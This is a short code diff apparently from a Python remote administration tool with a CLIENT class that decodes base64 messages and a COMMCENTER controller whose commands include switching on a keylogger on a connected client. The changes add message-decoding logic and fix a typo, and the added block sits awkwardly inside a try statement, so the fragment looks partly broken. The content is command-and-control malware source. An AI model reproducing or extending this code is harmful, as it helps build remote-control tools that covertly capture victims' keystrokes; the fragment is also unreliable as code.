@@ -285,6 +285,13 @@ class CLIENT:
             data += chunk.decode('utf-8')
             if self.KEY.encode('utf-8') in chunk:
                 try:
+                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
+                except UnicodeDecodeError:
+                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
+                if not self.MESSAGE:
+                    self.MESSAGE = " "
+                data = ""
+
                     
 
 
@@ -411,7 +418,7 @@ class COMMCENTER:
                 if args[1] == "status":
                     return
                 elif args[1] == "on":
-                    self.CURRENT[1].send_data("keylogger:on")w
+                    self.CURRENT[1].send_data("keylogger:on")
                     result = self.CURRENT[1].recv_data()
                     if result.strip(" "):
                         print(result)
